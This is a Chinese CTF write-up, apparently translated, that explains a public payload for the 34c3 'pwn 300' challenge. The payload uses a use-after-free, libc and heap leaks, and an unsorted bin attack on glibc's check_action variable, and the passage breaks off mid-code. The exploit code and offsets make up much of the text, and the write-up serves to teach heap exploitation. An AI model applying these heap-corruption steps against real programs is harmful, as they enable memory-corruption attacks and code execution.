# 一道pwn题带来的新思路 — 从unsorted bin attack 到 large bin attack
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
近来无事，于是又开始刷起了34c3 ctf的题，不得不感叹其题目出得好啊，虽然漏洞非常明显，但是你就是不知道怎么利用
刷到了题目名字为300的这道pwn题，想半天利用不了，于是去看了一下别人的wp
有两个wp
第一个wp是改了unsorted bin list，于是可以分配到一个堆的前面，利用house of orange 来get
shell，这个比较简单，具体怎么做直接google 搜wp就可以看到
第二个wp就是这篇文章主要分析的东西了
这里先贴一下[wp的地址](https://gist.github.com/sroettger/591b355b50f7f28f99b27ca6194681ad)
这篇wp其实只是一个payload，虽然附带少量的注释，但是第一次看到真的完全不知道他是怎么利用的
## 正式分析
这个pwn有四个功能,
alloc,read,write,free，alloc只能malloc固定大小为0x300的堆，read的话只能固定读0x300个字节，write的话跟puts差不多，打印到为止的内容，free的话free掉之后没用将指针给置0，所以可以实现UAF。
这个是pwn的程序的地址  
[pwn](https://github.com/DhavalKapil/ctf-writeups/tree/master/34c3ctf-2017/300)
说完程序的主要功能，我们来分析下payload吧
这里我省略一下payload的部分代码，下面是payload的主要代码
    alloc(0)
    alloc(1)
    alloc(2)
    alloc(3)
    free(2)
    free(0)
    heap = u64(pr(0).ljust(8, 'x00')) - 0x620
    libc.address = u64(pr(2).ljust(8, 'x00')) - 0x3c1b58
    print('heap: 0x{:x}'.format(heap))
    print('libc: 0x{:x}'.format(libc.address))
    check_action = libc.address + 0x3c1150
    main_arena = libc.address + 0x3c1b00
    top = main_arena+0x58
    bins_addr = main_arena + 0x68
    arena_free_list = libc.address+0x3c37c0
    # clean up
    free(1)
    free(3)
到这里为止，基本上都是常规操作，leak出libc 和heap的地址。
## 第一个关键点
    # create a chunk in the unsorted bin
    alloc(0)
    alloc(1)
    free(0)
    # corrupt the unsorted bin and use it to overwrite the check_action variable
    write(0, flat(0x1234, check_action-0x10))
    alloc(0)
    free(0)
这里利用unsorted bin attack，将check_action设置为unsorted bin 的地址，这个地址是main
arena+一定的偏移，但是基本上是对齐的
那么这里的作用是什么呢？  
我们来看下malloc的源码吧
在malloc中，存在着很多这种判断堆中某些值是否正常的代码，如果不正常了，就会调用malloc_printerr
接下来会调用__libc_message，第一个参数传进去的是do_abort
这里省略__libc_message中其他不重要的代码，这里是主要的退出判断逻辑
但是我们反编译一下libc.so，会看到下面的代码
这里的sub_80050就是malloc_printerr，传进去的是存在bss段的某个地址的值，其实这里就是payload里面的check_action
修改了这个值之后，就算出错了，程序也不会退出，这样就能干很多正常时候做不了的事情了
## 第二个关键点
这里他先把一些tuple加进一个list，但是这个我们暂时先不管，我们先来分析他的write what where
    for what, where in what_where:
      print('[0x{:012x}] = 0x{:x}'.format(where, what))
      # if we triggered an error, the arena will be marked as corrupted and a new one allocated
      # leak the address of that new arena first
      alloc(0)
      alloc(1)
      write(1, fit({0x20: 0x320}, length=0x300))
      free(0)
      leak = ''
      while len(leak)   